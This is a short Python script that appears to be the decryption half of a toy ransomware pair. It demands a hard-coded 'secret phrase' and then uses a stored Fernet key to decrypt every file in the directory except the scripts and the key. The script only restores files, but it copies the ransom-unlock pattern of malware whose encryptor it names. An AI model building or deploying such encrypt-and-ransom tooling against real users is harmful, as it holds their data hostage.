#!/usr/bin/env python3

import os # allows to go through directories
from cryptography.fernet import Fernet # allows to encrypt and decrypt

files = []
secretToUnlock = "buy me chicken nuggets" # secret phrase to unlock

user_phrase = input("Enter the secret phrase to decrypt all your files:\n") 

# checks if the input phrase is the same 

# if true -> decrypt all files
if user_phrase == secretToUnlock:

	for file in os.listdir():
		if file != "mata_encrypt-1.0.py" and file != "puppies.key" and file != "mata_decrypt-1.0.py":
			if os.path.isfile(file):
				files.append(file)

	print(files)

	with open("puppies.key", "rb") as key:
		thekey = key.read()

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(thekey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congratulations, you unlocked your files.")
	print("Keep safe...")
else:
	print("That wasn't correct")
